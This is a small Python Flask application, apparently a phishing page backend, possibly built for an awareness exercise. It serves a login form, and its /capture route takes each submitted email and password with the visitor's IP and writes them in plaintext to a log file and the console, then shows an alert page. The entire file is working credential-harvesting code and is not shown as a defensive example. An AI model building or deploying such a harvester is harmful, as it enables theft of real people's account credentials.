from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    heure = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Sauvegarder dans logs.txt
    with open('logs.txt', 'a') as f:
        f.write(f"[{heure}] IP: {ip} | Email: {email} | Password: {password}\n")

    print(f"[CAPTURE] {heure} - {email} : {password}")
    return render_template('alerte.html', email=email)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
